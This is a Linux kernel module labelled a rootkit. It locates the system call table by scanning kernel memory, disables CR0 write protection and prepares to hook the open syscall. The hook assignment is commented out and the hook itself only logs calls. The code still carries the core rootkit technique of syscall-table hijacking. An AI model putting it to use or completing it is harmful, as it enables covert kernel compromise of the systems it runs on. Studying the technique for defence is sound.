#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/printk.h>
#include <linux/syscalls.h>
#include <asm/processor.h>
#include <asm/page_64.h>
#include <asm/syscall.h>
#include <asm/unistd.h>

#define CPU_WRITE_PROT      0x10000

static inline void
force_pages_ro(void)
{
    write_cr0(read_cr0() | CPU_WRITE_PROT);
}

static inline void
force_pages_rw(void)
{
    write_cr0(read_cr0() & ~CPU_WRITE_PROT);
}

static void *sys_open = NULL;

static long
rootkit_sys_open(struct pt_regs const *regs)
{
    pr_info("open called\n");
    return ((sys_call_ptr_t)sys_open)(regs);
}

static void **syscall_table;

extern long sys_close(const struct pt_regs *regs);

static inline void
find_sys_call_table(void)
{
    void **addr = (void **)PAGE_OFFSET;
    while (addr)
    {
        if (addr[__NR_close] == sys_close)
        {
            syscall_table = addr;
            pr_info("sys_call_table found at %p\n", addr);
            break;
        }
        ++addr;
    }
}

#define SYSCALL_TABLE_PHYS  0xFFFFFFFF81E001A0

static __init int
rootkit_load(void)
{
    pr_info("phys_base = 0x%lx\n", phys_base);
    pr_info("phys sys_call_table = 0x%lx\n", SYSCALL_TABLE_PHYS);
    pr_info("virt sys_call_table = 0x%x\n", 0);

    pr_info("__START_KERNEL_map = 0x%lx\n", __START_KERNEL_map);
    pr_info("PAGE_OFFSET = 0x%lx\n", PAGE_OFFSET);

    find_sys_call_table();

    pr_info("set rw\n");
    force_pages_rw();
    pr_info("get sys_open\n");
    sys_open = syscall_table[__NR_open];
    pr_info("sys_open at %p\n", sys_open);
    /*
    pr_info("set sys_open\n");
    syscall_table[__NR_open] = &rootkit_sys_open;
    */
    pr_info("set ro\n");
    force_pages_ro();
    pr_info("done\n");
    return 0;
}

static __exit void
rootkit_unload(void)
{
    force_pages_rw();
    syscall_table[__NR_open] = sys_open;
    force_pages_ro();
}

module_init(rootkit_load);
module_exit(rootkit_unload);

MODULE_AUTHOR("Victorien Le Couviour--Tuffet <victorien.lecouviour.tuffet@gmail.com>");
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("syscall hooker");
